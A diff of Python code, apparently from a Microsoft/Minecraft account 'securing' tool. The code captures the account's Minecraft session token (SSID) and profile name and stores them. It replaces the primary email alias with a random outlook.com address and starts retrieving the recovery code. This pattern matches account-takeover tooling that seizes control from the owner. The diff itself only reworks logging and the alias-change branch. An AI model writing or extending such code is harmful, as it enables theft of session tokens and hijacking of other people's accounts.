@@ -67,8 +67,10 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
 
         # XBL && Token
         xbl = XBLResponse["xbl"]
+
         ssid = await get_ssid(xbl)
         
+        # Get capes, profile and purchase method
         if ssid:    
             print("[+] - Got SSID! (Has Minecraft)")
 
@@ -81,12 +83,12 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
 
             # Gets account name
             profile = await get_profile(ssid)
-            if profile:
+            if not profile:
+                print("[x] - Failed to get profile (No Minecraft Java)")
+            else:
                 print(f"[+] - Got profile (Has Minecraft Java)")
                 accountInfo["minecraft"]["SSID"] = ssid
                 accountInfo["minecraft"]["name"] = profile
-            else:
-                print("[x] - Failed to get profile (No Minecraft Java)")
                 
                 # Wether its changeable
                 usernameInfo = await get_username_info(ssid)
@@ -137,18 +139,13 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
 
             # Changes Primary Alias
             if replace_alias:
-            
                 primaryEmail = f"auto{uuid.uuid4().hex[:12]}"
-                print(f"[+] - Generated Primary Email ({primaryEmail}@outlook.com)")
                 change_alias = await change_primary_alias(session, primaryEmail, apicanary)
-                print(f"Primary Value: {change_alias}")
                 if change_alias:
+                    print(f"[+] - Changed Primary Email ({primaryEmail}@outlook.com)")
                     accountInfo["microsoft"]["email"] = f"{primaryEmail}@outlook.com"
-                    main_email = f"{primaryEmail}@outlook.com"
                 else:
-                    accountInfo["microsoft"]["email"] = main_email
-            else:
-                accountInfo["microsoft"]["email"] = main_email
+                    print(f"[X] - Failed to change Primary Email")
 
             # Gets recovery code
             recovery_code = await get_recovery_code(
